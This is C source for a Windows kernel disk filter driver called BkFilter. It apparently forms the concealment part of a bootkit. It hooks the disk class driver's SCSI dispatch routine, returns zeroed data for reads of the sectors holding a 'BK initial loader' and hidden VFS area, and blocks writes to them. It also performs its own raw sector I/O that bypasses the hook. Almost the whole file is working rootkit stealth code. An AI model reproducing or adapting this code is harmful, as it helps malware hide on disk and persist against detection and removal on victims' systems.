//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// BkFilter project
//	
// module: bkfilter.c
// $Revision: 67 $
// $Date: 2012-05-29 22:20:56 +0400 (Вт, 29 май 2012) $
// description: 
//	Disk filter driver. 
//	Protects BK initial loader and VFS area (if any) from unauthorized reading and writing.


#include <ntddk.h>
#include <ntdddisk.h>
#include <ntddscsi.h>
#include <srb.h>
#include <scsi.h>

#include "version.h"
#include "ntddkex.h"
#include "kdbg.h"
#include "..\bkdrv\bkdrv.h"
#include "..\bkdrv\khook.h"

#include "bklib.h"
#include "bkfilter.h"


PDEVICE_OBJECT IoGetLowerDeviceObject(
  __in  PDEVICE_OBJECT DeviceObject
);


#define		wczBootDevice		L"\\Device\\Harddisk0\\DR0"
#define		wczHarddisk0		L"\\Device\\Harddisk0"
#define		wczHarddiskVolume1	L"\\Device\\HarddiskVolume1"

#define		NTFS_LOADER_SIZE	16	// sectors


BK_FS_AREA		g_FsArea;
PDEVICE_OBJECT	g_ClassDevice = NULL;
ULONG			g_MySrbMark = 0;


NTSTATUS my_DispatchScsi(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp);
HOOK_FUNCTION hook_DispatchScsi = {NULL, NULL, &my_DispatchScsi, NULL, NULL};
static HOOK ClassDispatchScsi = DEFINE_HOOK(&hook_DispatchScsi, HOOK_TYPE_POINTER);


// ---- Predefinitions ----------------------------------------------------------------------------------------------------

PUNICODE_STRING	AllocUniString(VOID);
VOID FreeUniString(PUNICODE_STRING	pUs);
LONG volatile	g_WorkerEntryCount;


// ---- Debug support routines --------------------------------------------------------------------------------------------


#if DBG
VOID
	DbgPrintCdb(
		 IN PCDB Cdb,
		 IN ULONG Length
		 )
{
	DbgPrint("\tCdb:\n\t\tOpCode: %02X\n",
		Cdb->CDB6GENERIC.OperationCode);
}

PSTR g_SrbFlags[]={
	"0x00000001",
	"SRB_FLAGS_QUEUE_ACTION_ENABLE",
	"SRB_FLAGS_DISABLE_DISCONNECT",
	"SRB_FLAGS_DISABLE_SYNCH_TRANSFER",

	"SRB_FLAGS_BYPASS_FROZEN_QUEUE",
	"SRB_FLAGS_DISABLE_AUTOSENSE",
	"SRB_FLAGS_DATA_IN",
	"SRB_FLAGS_DATA_OUT",

	"SRB_FLAGS_NO_QUEUE_FREEZE",
	"SRB_FLAGS_ADAPTER_CACHE_ENABLE",
	"SRB_FLAGS_FREE_SENSE_BUFFER",
	"0x00000800",

	"0x00001000",
	"0x00002000",
	"0x00004000",
	"0x00008000",

	"SRB_FLAGS_IS_ACTIVE",
	"SRB_FLAGS_ALLOCATED_FROM_ZONE",
	"SRB_FLAGS_SGLIST_FROM_POOL",
	"SRB_FLAGS_BYPASS_LOCKED_QUEUE",

	"SRB_FLAGS_NO_KEEP_AWAKE",
	"SRB_FLAGS_PORT_DRIVER_ALLOCSENSE",
	"SRB_FLAGS_PORT_DRIVER_SENSEHASPORT",
	"SRB_FLAGS_DONT_START_NEXT_PACKET",

	"PORT 0x01000000",
	"PORT 0x02000000",
	"PORT 0x04000000",
	"PORT 0x08000000",

	"CLASS 0x10000000",
	"CLASS 0x20000000",
	"CLASS 0x40000000",
	"CLASS 0x80000000"
};

VOID
	DbgPrintSrbFlags(
		IN ULONG SrbFlags
		)
{
	ULONG i;
	DbgPrint("\tSrbFlags: ");

	if(!SrbFlags)
		DbgPrint("SRB_FLAGS_NO_DATA_TRANSFER");
	else
	{
		for(i=0;SrbFlags;++i,SrbFlags>>=1)
		{
			if(SrbFlags&1)
			{
				DbgPrint("%s",g_SrbFlags[i]);
				if(SrbFlags&0xFFFFFFFE)
					DbgPrint("|\n\t\t");
			}
		}
	}
	DbgPrint("\n");
}

PSTR g_SrbFuncs[]={
	"SRB_FUNCTION_EXECUTE_SCSI",
	"SRB_FUNCTION_CLAIM_DEVICE",
	"SRB_FUNCTION_IO_CONTROL",
	"SRB_FUNCTION_RECEIVE_EVENT",
	"SRB_FUNCTION_RELEASE_QUEUE",
	"SRB_FUNCTION_ATTACH_DEVICE",
	"SRB_FUNCTION_RELEASE_DEVICE",
	"SRB_FUNCTION_SHUTDOWN",
	"SRB_FUNCTION_FLUSH",
	"SRB_FUNCTION_ABORT_COMMAND",
	"SRB_FUNCTION_RELEASE_RECOVERY",
	"SRB_FUNCTION_RESET_BUS",
	"SRB_FUNCTION_RESET_DEVICE",
	"SRB_FUNCTION_TERMINATE_IO",
	"SRB_FUNCTION_FLUSH_QUEUE",
	"SRB_FUNCTION_REMOVE_DEVICE",
	"SRB_FUNCTION_WMI",
	"SRB_FUNCTION_LOCK_QUEUE",
	"SRB_FUNCTION_UNLOCK_QUEUE",
	"SRB_FUNCTION_RESET_LOGICAL_UNIT"
};

VOID
	DbgPrintSrb(
		IN PSCSI_REQUEST_BLOCK Srb
		)

{
	DbgPrint("SRB:\n\tLength: %d\n\tFunction: %s\n\tPathId: %d\n\tTargetId: %d\n\tLun: %d\n",
		Srb->Length,Srb->Function>SRB_FUNCTION_RESET_LOGICAL_UNIT?"Invalid function"
		:g_SrbFuncs[Srb->Function], Srb->PathId,Srb->TargetId,Srb->Lun);
	DbgPrint("\tCdbLength: %d\n\tSenseInfoBufferLength: %d\n", Srb->CdbLength,Srb->SenseInfoBufferLength);
	DbgPrintSrbFlags(Srb->SrbFlags);
	DbgPrint("\tDataTransferLength: %d\n\tTimeOutValue: %d\n", Srb->DataTransferLength,Srb->TimeOutValue);
	DbgPrintCdb((PCDB)Srb->Cdb,Srb->CdbLength);
}

#endif


//
//	Returns a pointer to the next-lower-level device object on the driver stack if any.
//	Reurns STATUS_NOT_FOUND if the next-lower-level driver is not loaded or 
//	 the specified device is the lowest device object in the driver stack
//
NTSTATUS GetLowerDeviceObjectByName(
	IN	PUNICODE_STRING uDeviceName,	// name of a device
	OUT	PDEVICE_OBJECT* pDeviceObj		// receives a pointer to the next-lower-level device object
	)
{
	HANDLE		hFile;
	NTSTATUS	ntStatus;
	PFILE_OBJECT	FileObj;
	PDEVICE_OBJECT	DeviceObj = NULL;
	OBJECT_ATTRIBUTES	oa;
	IO_STATUS_BLOCK		IoStatus;

	InitializeObjectAttributes(&oa, uDeviceName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

	ntStatus = ZwOpenFile(&hFile, GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE, &oa, &IoStatus,
		FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT);

	if (NT_SUCCESS(ntStatus))
	{
		ntStatus = ObReferenceObjectByHandle(hFile, GENERIC_READ, *IoFileObjectType, KernelMode, &FileObj, NULL);
		if (NT_SUCCESS(ntStatus))
		{			
			if (DeviceObj = IoGetLowerDeviceObject(FileObj->DeviceObject))
				*pDeviceObj = DeviceObj;
			else
				ntStatus = STATUS_NOT_FOUND;
			ObDereferenceObject(FileObj);
		}
		ZwClose(hFile);
	}	// if (NT_SUCCESS(ntStatus))

	return(ntStatus);
}	


NTSTATUS	FltAttachClassDeviceDriver(PUNICODE_STRING	uDeviceName)
{
	NTSTATUS		ntStatus;
	PDRIVER_OBJECT	DriverObj;
	LARGE_INTEGER	TickCount;

	if (NT_SUCCESS(ntStatus = GetLowerDeviceObjectByName(uDeviceName, &g_ClassDevice)))
	{
		DriverObj = g_ClassDevice->DriverObject;

		// Initializing BK internal request mark value
		KeQueryTickCount(&TickCount);
		g_MySrbMark = TickCount.LowPart;

		// Setting hooks
		if (DriverObj->MajorFunction[IRP_MJ_SCSI])
			SetHook(&ClassDispatchScsi, &DriverObj->MajorFunction[IRP_MJ_SCSI], DriverObj->DriverStart);
	} 

	return(ntStatus);
}


VOID	FltReplaceRead(
	ULONGLONG	StartBlock,
	ULONG		NumberBlocks,
	PCHAR		DataBuffer,
	ULONG		Length
	)
{
	ULONG	Skipped;
	PCHAR	FillBuffer;
	ULONG	FillLength = 0;

	if ((StartBlock + NumberBlocks) > g_FsArea.StartSector && StartBlock < (g_FsArea.StartSector + g_FsArea.NumberOfSectors))
	{
		FillBuffer = DataBuffer;
		FillLength = Length;

		if (StartBlock < g_FsArea.StartSector)
		{
			Skipped = ((ULONG)(g_FsArea.StartSector - StartBlock)) * g_FsArea.BytesPerSector;
			ASSERT(FillLength > Skipped);
			FillBuffer += Skipped;
			FillLength -= Skipped;
		}

		if ((StartBlock + NumberBlocks) > (g_FsArea.StartSector + g_FsArea.NumberOfSectors))
		{
			Skipped = (ULONG)((StartBlock + NumberBlocks) - (g_FsArea.StartSector + g_FsArea.NumberOfSectors));
			Skipped *= g_FsArea.BytesPerSector;
			ASSERT(FillLength > Skipped);
			FillLength -= Skipped;
		}

		if (FillLength)
		{
			RtlZeroMemory(FillBuffer, FillLength);
			KdPrint(("BKFLT: Replace %u bytes read starting from sector %u.\n", FillLength, (ULONG)StartBlock + (ULONG)(FillBuffer - DataBuffer) / g_FsArea.BytesPerSector));
		}
	}

	if (((StartBlock + NumberBlocks) > g_FsArea.BootSector && StartBlock < (g_FsArea.BootSector + 16)))
	{
		FillBuffer = DataBuffer;
		FillLength = Length;

		if (StartBlock < g_FsArea.BootSector)
		{
			Skipped = ((ULONG)(g_FsArea.BootSector - StartBlock)) *  g_FsArea.BytesPerSector;
			ASSERT(FillLength > Skipped);
			FillBuffer += Skipped;
			FillLength -= Skipped;
		}

		if ((StartBlock + NumberBlocks) > (g_FsArea.BootSector + 16))
		{
			Skipped = (ULONG)((StartBlock + NumberBlocks) - (g_FsArea.BootSector + 16));
			Skipped *= g_FsArea.BytesPerSector;
			ASSERT(FillLength > Skipped);
			FillLength -= Skipped;
		}

		KdPrint(("BKFLT: Replace %u bytes read starting from sector %u.\n", FillLength, (ULONG)StartBlock + (ULONG)(FillBuffer - DataBuffer) / g_FsArea.BytesPerSector));
	}	// if ((StartBlock + NumberBlocks) > g_FsArea.StartSector && StartBlock < (g_FsArea.StartSector + g_FsArea.NumberOfSectors))		
}


BOOL	FltIsWithinBkArea(
	ULONGLONG	StartBlock,
	ULONG		NumberBlocks
	)
{
	BOOL Ret = FALSE;

	if (((StartBlock + NumberBlocks) > g_FsArea.StartSector && 	StartBlock < (g_FsArea.StartSector + g_FsArea.NumberOfSectors)) ||
		((StartBlock + NumberBlocks) > g_FsArea.BootSector && StartBlock < (g_FsArea.BootSector + 16)))
		Ret = TRUE;

	return(Ret);
}

//
//	Parses specified SRB extracting starting block address, number of blocks, buffer and it's length.
//
UCHAR FltParseSrb(
	IN	PIRP		Irp,
	OUT	PULONGLONG	pStartBlock,
	OUT	PULONG		pNumberBlocks,
	OUT	PCHAR*		pDataBuffer,
	OUT	PULONG		pLength
	)
{		
	PIO_STACK_LOCATION	IrpStack = IoGetCurrentIrpStackLocation(Irp);
	PSCSI_REQUEST_BLOCK	Srb = IrpStack->Parameters.Scsi.Srb;
	PCDB	pCdb = (PCDB)Srb->Cdb;
	UCHAR	CdbOpCode = ((PCDB)Srb->Cdb)->CDB6GENERIC.OperationCode;

	LARGE_INTEGER	LogicalBlockAddr;
	ULONG	NumberBlocks = 0;
	PCHAR	UserBuffer;


	if (CdbOpCode == SCSIOP_READ || CdbOpCode == SCSIOP_WRITE || 
		CdbOpCode == SCSIOP_READ_DATA_BUFF || CdbOpCode == SCSIOP_WRITE_DATA_BUFF)
	{
		// Checking if current SRB is not marked as BK internal request
		if (Srb->QueueSortKey != g_MySrbMark)
		{
			if ((Irp->MdlAddress) && (UserBuffer = MmGetSystemAddressForMdlSafe(Irp->MdlAddress, LowPagePriority)))
			{
				//	DataBuffer contains the same as MmGetMdlVirtualAddress(Irp->Mdl) + offset (where offset is non-zero if 
				//		SRB is a result of breaking a big request to smaller chunks) or NULL.
				if (Srb->DataBuffer)
					UserBuffer = Srb->DataBuffer;

				if ( Srb->CdbLength == 16 )
				{
					REVERSE_BYTES_QUAD(&LogicalBlockAddr, pCdb->CDB16.LogicalBlock);
					REVERSE_BYTES(&NumberBlocks, pCdb->CDB16.TransferLength);
				}
				else if ( Srb->CdbLength == 10 )
				{
					LogicalBlockAddr.HighPart = 0;
					((PFOUR_BYTE)&LogicalBlockAddr.LowPart)->Byte0=pCdb->CDB10.LogicalBlockByte3;
					((PFOUR_BYTE)&LogicalBlockAddr.LowPart)->Byte1=pCdb->CDB10.LogicalBlockByte2;
					((PFOUR_BYTE)&LogicalBlockAddr.LowPart)->Byte2=pCdb->CDB10.LogicalBlockByte1;
					((PFOUR_BYTE)&LogicalBlockAddr.LowPart)->Byte3=pCdb->CDB10.LogicalBlockByte0;
					((PFOUR_BYTE)&NumberBlocks)->Byte0=pCdb->CDB10.TransferBlocksLsb;
					((PFOUR_BYTE)&NumberBlocks)->Byte1=pCdb->CDB10.TransferBlocksMsb;
				}
				else 
				{
					ASSERT(FALSE);
				}

				*pStartBlock	= (ULONGLONG)LogicalBlockAddr.QuadPart;
				*pNumberBlocks	= NumberBlocks;
				*pLength = Srb->DataTransferLength;
				*pDataBuffer = UserBuffer;
			}	// if ((Irp->MdlAddress) && (UserBuffer = MmGetSystemAddressForMdlSafe(MdlAddress, LowPagePriority)))
			else
				// No User buffer specified, skipping
				CdbOpCode = SCSIOP_TEST_UNIT_READY;
		}	// if (Srb->QueueSortKey != g_MySrbMark)
		else
		{
			// Restoring Srb->QueueSortKey value
			((PFOUR_BYTE)&Srb->QueueSortKey)->Byte0 = pCdb->CDB10.LogicalBlockByte3;
			((PFOUR_BYTE)&Srb->QueueSortKey)->Byte1 = pCdb->CDB10.LogicalBlockByte2;
			((PFOUR_BYTE)&Srb->QueueSortKey)->Byte2 = pCdb->CDB10.LogicalBlockByte1;
			((PFOUR_BYTE)&Srb->QueueSortKey)->Byte3 = pCdb->CDB10.LogicalBlockByte0;

			// Skipping current SRB
			CdbOpCode = SCSIOP_TEST_UNIT_READY;
		}
	}	// if (CdbOpCode == SCSIOP_READ || CdbOpCode == SCSIOP_WRITE || 

	return(CdbOpCode);
}



NTSTATUS FltIrpCompletionRoutine(
    IN PDEVICE_OBJECT DeviceObject,
    IN PIRP Irp,
    IN PVOID Context
    )
{
	NTSTATUS	ntStatus1, ntStatus = STATUS_MORE_PROCESSING_REQUIRED;
	PFLT_COMPLETION_CONTEXT FltCtx = (PFLT_COMPLETION_CONTEXT)Context;
	PIO_STACK_LOCATION		IrpStack = IoGetCurrentIrpStackLocation(Irp);

	// restore saved completion routine, context and control flags
	IrpStack->CompletionRoutine = FltCtx->CompletionRoutine;
	IrpStack->Context = FltCtx->CompletionContext;
	IrpStack->Control = FltCtx->Control;

	ntStatus1 = Irp->IoStatus.Status;

	if (NT_SUCCESS(ntStatus1))
	{
		PCHAR UserBuffer = MmGetSystemAddressForMdlSafe(Irp->MdlAddress, LowPagePriority);
		FltReplaceRead(FltCtx->StartBlock, FltCtx->NumberBlocks, UserBuffer, FltCtx->Length);
	}		

	if (IrpStack->CompletionRoutine)
	{
		if ((NT_SUCCESS(ntStatus1) && (IrpStack->Control | SL_INVOKE_ON_SUCCESS)) ||
			(ntStatus1 == STATUS_CANCELLED && (IrpStack->Control | SL_INVOKE_ON_CANCEL)) ||
			(!NT_SUCCESS(ntStatus1) && ntStatus1 != STATUS_CANCELLED && (IrpStack->Control | SL_INVOKE_ON_ERROR))
			)
		{
			// Calling original IO completion routine
			ntStatus = (IrpStack->CompletionRoutine)(DeviceObject, Irp, IrpStack->Context);
		}
	}	// if (IrpStack->CompletionRoutine)

	MyFreePool(FltCtx);

    return(ntStatus);
}


NTSTATUS FltForwardScsiIrpAsync(
    IN PDEVICE_OBJECT DeviceObject,
    IN PIRP			Irp,
	IN ULONGLONG	StartBlock,
	ULONG			NumberBlocks,
	PCHAR			DataBuffer,
	ULONG			Length
    )
{
	NTSTATUS	ntStatus = STATUS_INSUFFICIENT_RESOURCES;
	PFLT_COMPLETION_CONTEXT	FltCtx;
	PIO_STACK_LOCATION		IrpStack = IoGetCurrentIrpStackLocation(Irp);


	if (FltCtx = MyAllocatePool(NonPagedPool, sizeof(FLT_COMPLETION_CONTEXT)))
	{
		FltCtx->StartBlock = StartBlock;
		FltCtx->NumberBlocks = NumberBlocks;
		FltCtx->DataBuffer = DataBuffer;
		FltCtx->Length	= Length;

		// save previouse completion routine, context and control flags
		FltCtx->CompletionRoutine = IrpStack->CompletionRoutine;
		FltCtx->CompletionContext = IrpStack->Context;
		FltCtx->Control = IrpStack->Control;

		// set a completion routine, context and control flags
		IrpStack->CompletionRoutine = &FltIrpCompletionRoutine;
		IrpStack->Context = FltCtx;
		IrpStack->Control = SL_INVOKE_ON_CANCEL | SL_INVOKE_ON_SUCCESS | SL_INVOKE_ON_ERROR;

		// call the next lower device
		ntStatus = ((PDRIVER_DISPATCH)hook_DispatchScsi.Original)(DeviceObject, Irp);
	}
    return(ntStatus);

}	// FltProcessScsiIrpSynchronous



// ---- Filter API functions -------------------------------------------------------------------------------------------------

NTSTATUS FltIoCompleteCallback(
    IN PDEVICE_OBJECT DeviceObject,
    IN PIRP Irp,
    IN PVOID Context
    )
{
    Irp->UserIosb->Status = Irp->IoStatus.Status;
    Irp->UserIosb->Information = Irp->IoStatus.Information;
	KeSetEvent(Irp->UserEvent, IO_NO_INCREMENT, FALSE);

	UNREFERENCED_PARAMETER(DeviceObject);
	UNREFERENCED_PARAMETER(Context);

    return STATUS_MORE_PROCESSING_REQUIRED;
}


NTSTATUS FltReadWriteSectors(
    IN ULONG MajorFunction, 
    IN PVOID Buffer, 
    IN ULONG SectorOffset, 
    IN ULONG SectorCount
    )
{
    PCDB	Cdb;
    ULONG	Length;
	PMDL    Mdl;
    KEVENT	Event;
    PIRP	Irp;
	NTSTATUS	ntStatus = STATUS_INSUFFICIENT_RESOURCES;
	PSCSI_REQUEST_BLOCK Srb;
    IO_STATUS_BLOCK     IoStatus;
    PIO_STACK_LOCATION  IrpSp;
	PSENSE_DATA         SenseData;


	if (g_ClassDevice)
	{
		Length = SectorCount * g_FsArea.BytesPerSector;

		if (Srb = MyAllocatePool(NonPagedPool, sizeof(SCSI_REQUEST_BLOCK) + sizeof(SENSE_DATA)))
		{
			RtlZeroMemory(Srb, sizeof(SCSI_REQUEST_BLOCK) + sizeof(SENSE_DATA));
			SenseData = (PSENSE_DATA)(Srb + 1);

			if (Irp = IoAllocateIrp(g_ClassDevice->StackSize, FALSE))
			{
				 if (Mdl = IoAllocateMdl(Buffer, Length, FALSE, FALSE, Irp))
				 {
					 MmProbeAndLockPages(Mdl, KernelMode, MajorFunction == IRP_MJ_WRITE ? IoReadAccess : IoWriteAccess);
				 
					 // Initializing the SRB
					 Srb->Length = sizeof(SCSI_REQUEST_BLOCK);
					 Srb->Function = SRB_FUNCTION_EXECUTE_SCSI;
					 Srb->OriginalRequest = Irp;
					 Srb->DataBuffer = Buffer;
					 				 
					 Srb->DataTransferLength = Length;
					 Srb->QueueAction = SRB_SIMPLE_TAG_REQUEST;
					 Srb->SrbStatus = SRB_STATUS_PENDING;
					 Srb->ScsiStatus = STATUS_SUCCESS;
					 Srb->SenseInfoBuffer = SenseData;
					 Srb->SenseInfoBufferLength = sizeof(SENSE_DATA);

					 if (MajorFunction == IRP_MJ_READ)
						 Srb->SrbFlags = SRB_FLAGS_DATA_IN;
					 else
						 Srb->SrbFlags = SRB_FLAGS_DATA_OUT;
					 
					 Srb->SrbFlags = Srb->SrbFlags | 0x40000100;
					 if (MajorFunction == IRP_MJ_READ)
						 Srb->SrbFlags |= SRB_FLAGS_ADAPTER_CACHE_ENABLE;
					 else
						 Srb->SrbFlags |= SRB_FLAGS_DISABLE_AUTOSENSE;
					 
					 Srb->TimeOutValue = (Length / 1024) + 1;
					 Srb->CdbLength = 10;

					 // Marking SRB as BK internal request to transfer it to underlying driver without any processing
					 Srb->QueueSortKey = g_MySrbMark;
					 
					 // Initializing the CDB
					 Cdb = (PCDB)Srb->Cdb;
					 Cdb->CDB10.OperationCode = (UCHAR)((MajorFunction - IRP_MJ_READ) + (MajorFunction - IRP_MJ_READ) + SCSIOP_READ);
					 Cdb->CDB10.LogicalUnitNumber = 4;

					 Cdb->CDB10.LogicalBlockByte0 = (UCHAR)(SectorOffset >> 24);
					 Cdb->CDB10.LogicalBlockByte1 = (UCHAR)(SectorOffset >> 16);
					 Cdb->CDB10.LogicalBlockByte2 = (UCHAR)(SectorOffset >> 8);
					 Cdb->CDB10.LogicalBlockByte3 = (UCHAR)SectorOffset;
					 
					 Cdb->CDB10.TransferBlocksMsb = (UCHAR)(SectorCount >> 8);
					 Cdb->CDB10.TransferBlocksLsb = (UCHAR)SectorCount;

					 // Initializing the IRP
					 ASSERT(Irp->MdlAddress == Mdl);
					 Irp->UserIosb = &IoStatus;
					 Irp->UserEvent = &Event;
					 Irp->IoStatus.Status = STATUS_SUCCESS;
					 Irp->IoStatus.Information = 0;
					 Irp->Flags = IRP_SYNCHRONOUS_API | IRP_NOCACHE;
					 Irp->AssociatedIrp.SystemBuffer = NULL;
					 Irp->Cancel = FALSE;
					 Irp->RequestorMode = KernelMode;
					 Irp->CancelRoutine = NULL;
					 Irp->Tail.Overlay.Thread = (PETHREAD)KeGetCurrentThread();
					 
					 IrpSp = IoGetNextIrpStackLocation(Irp);
					 IrpSp->DeviceObject = g_ClassDevice;
					 IrpSp->MajorFunction = IRP_MJ_INTERNAL_DEVICE_CONTROL;
					 IrpSp->Parameters.Scsi.Srb = Srb;
					 
  					 KeInitializeEvent(&Event, NotificationEvent, FALSE);
					 IoSetCompletionRoutine(Irp, FltIoCompleteCallback, Srb, TRUE, TRUE, TRUE);
					 
					  // Calling the target class device
					 ntStatus = IoCallDriver(g_ClassDevice, Irp);
					
					 if (ntStatus == STATUS_PENDING)
					 {
						 KeWaitForSingleObject(&Event, Executive, KernelMode, FALSE, NULL);
						 ntStatus = IoStatus.Status;
					 }
					 
					 if (Srb->SenseInfoBuffer != SenseData)
					 {
						 if (Srb->SenseInfoBuffer)					 
							 MyFreePool(Srb->SenseInfoBuffer);
					 }

					 MmUnlockPages(Mdl);
					 IoFreeMdl(Mdl);
				 }	// if (Mdl = IoAllocateMdl(Buffer, Length, FALSE, FALSE, Irp))
				 IoFreeIrp(Irp);
			}	// if (Irp = IoAllocateIrp(DeviceObject->StackSize, FALSE))
			MyFreePool(Srb);
		}	// if (Srb = MyAllocatePool(NonPagedPool, sizeof(SCSI_REQUEST_BLOCK) + sizeof(SENSE_DATA)))
	}	// if (g_ClassDevice)

    return (ntStatus);
}

// ---- Filter hook functions ------------------------------------------------------------------------------------------------

//
//	Standard IRP_MJ_SCSI dispatch routine hook
//
NTSTATUS my_DispatchScsi(
    IN PDEVICE_OBJECT DeviceObject,
    IN PIRP Irp
    )
{
	NTSTATUS	ntStatus = STATUS_REQUEST_NOT_ACCEPTED;
	ULONGLONG	StartBlock;
	ULONG	NumberBlocks, Length;
	UCHAR	CdbOpCode;
	PCHAR	DataBuffer;
	
	ENTER_HOOK();

	if (DeviceObject == g_ClassDevice)
	{
		//DbgPrintSrb(Srb);

		CdbOpCode = FltParseSrb(Irp, &StartBlock, &NumberBlocks, &DataBuffer, &Length);

		if (CdbOpCode == SCSIOP_WRITE || CdbOpCode == SCSIOP_WRITE_DATA_BUFF)
		{
			if (FltIsWithinBkArea(StartBlock, NumberBlocks))
			{
				ntStatus = STATUS_ACCESS_DENIED;
				Irp->IoStatus.Status = ntStatus;
				IoCompleteRequest(Irp, IO_NO_INCREMENT);
				KdPrint(("BKFLT: Write from %u for %u sectors - blocked.\n", (ULONG)StartBlock, NumberBlocks));
			}
		}	// if (CdbOpCode == SCSIOP_WRITE || CdbOpCode == SCSIOP_WRITE_DATA_BUFF)
		else if (CdbOpCode == SCSIOP_READ || CdbOpCode == SCSIOP_READ_DATA_BUFF)
		{
			if (FltIsWithinBkArea(StartBlock, NumberBlocks))
				ntStatus = FltForwardScsiIrpAsync(DeviceObject, Irp, StartBlock, NumberBlocks, DataBuffer, Length);

		}	// else if (CdbOpCode == SCSIOP_READ || CdbOpCode == SCSIOP_READ_DATA_BUFF)
	}	// if (DeviceObject == g_ClassDevice)

	if (ntStatus == STATUS_REQUEST_NOT_ACCEPTED)
		ntStatus = ((PDRIVER_DISPATCH)hook_DispatchScsi.Original)(DeviceObject, Irp);

	LEAVE_HOOK();

	return(ntStatus);
}	// my_DispatchScsi


// ---- Filter startup/cleanup -----------------------------------------------------------------------------------------------

NTSTATUS	FltStartup(IN PBK_FS_AREA FsArea)
{
	NTSTATUS	ntStatus = STATUS_INSUFFICIENT_RESOURCES;
	UNICODE_STRING	uDeviceName = RTL_CONSTANT_STRING(wczBootDevice);

	KdPrint(("BKFLT: BK filter driver started.\n"));

	HookInit();

	RtlMoveMemory(&g_FsArea, FsArea, sizeof(BK_FS_AREA));

	ntStatus = FltAttachClassDeviceDriver(&uDeviceName);

	KdPrint(("BKFLT: Driver entry finished with status %x\n", ntStatus));

	return(ntStatus);
}


VOID FltCleanup(VOID)
{
	RemoveAllHooks(NULL);
	WaitForHooks();

	KdPrint(("BKFLT: BK filter driver unloaded.\n"));
}




